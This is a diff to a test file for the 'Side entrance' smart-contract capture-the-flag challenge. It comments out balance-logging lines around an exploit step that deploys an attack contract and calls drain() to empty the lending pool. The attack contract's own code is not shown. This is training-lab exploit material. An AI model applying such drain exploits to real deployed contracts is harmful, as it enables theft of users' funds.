@@ -29,59 +29,59 @@ describe("[Challenge] Side entrance", function () {
 
 	it("Exploit", async function () {
 		/** CODE YOUR EXPLOIT HERE */
-		console.log(
-			"before drainning,      attacker balance: %s, pool balance: %s, attack contract balance: %s",
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(attacker.address),
-				18
-			),
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(this.pool.address),
-				18
-			),
-			NaN
-		);
+		// console.log(
+		// 	"before drainning,      attacker balance: %s, pool balance: %s, attack contract balance: %s",
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(attacker.address),
+		// 		18
+		// 	),
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(this.pool.address),
+		// 		18
+		// 	),
+		// 	NaN
+		// );
 		const AttackSideEntranceFactory = await ethers.getContractFactory(
 			"AttackSideEntrance",
 			attacker
 		);
 		this.attack = await AttackSideEntranceFactory.deploy(this.pool.address);
 
-		console.log(
-			"after deploy,          attacker balance: %s, pool balance: %s, attack contract balance: %s",
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(attacker.address),
-				18
-			),
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(this.pool.address),
-				18
-			),
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(this.attack.address),
-				18
-			)
-		);
+		// console.log(
+		// 	"after deploy,          attacker balance: %s, pool balance: %s, attack contract balance: %s",
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(attacker.address),
+		// 		18
+		// 	),
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(this.pool.address),
+		// 		18
+		// 	),
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(this.attack.address),
+		// 		18
+		// 	)
+		// );
 
-		console.log("attacker address: %s", attacker.address);
-		console.log("attack contract address: %s", this.attack.address);
-		console.log("pool address: %s", this.pool.address);
+		// console.log("attacker address: %s", attacker.address);
+		// console.log("attack contract address: %s", this.attack.address);
+		// console.log("pool address: %s", this.pool.address);
 		await this.attack.connect(attacker).drain(ETHER_IN_POOL);
-		console.log(
-			"after attacker drain,  attacker balance: %s, pool balance: %s, attack contract balance: %s",
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(attacker.address),
-				18
-			),
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(this.pool.address),
-				18
-			),
-			ethers.utils.formatUnits(
-				await ethers.provider.getBalance(this.attack.address),
-				18
-			)
-		);
+		// console.log(
+		// 	"after attacker drain,  attacker balance: %s, pool balance: %s, attack contract balance: %s",
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(attacker.address),
+		// 		18
+		// 	),
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(this.pool.address),
+		// 		18
+		// 	),
+		// 	ethers.utils.formatUnits(
+		// 		await ethers.provider.getBalance(this.attack.address),
+		// 		18
+		// 	)
+		// );
 	});
 
 	after(async function () {
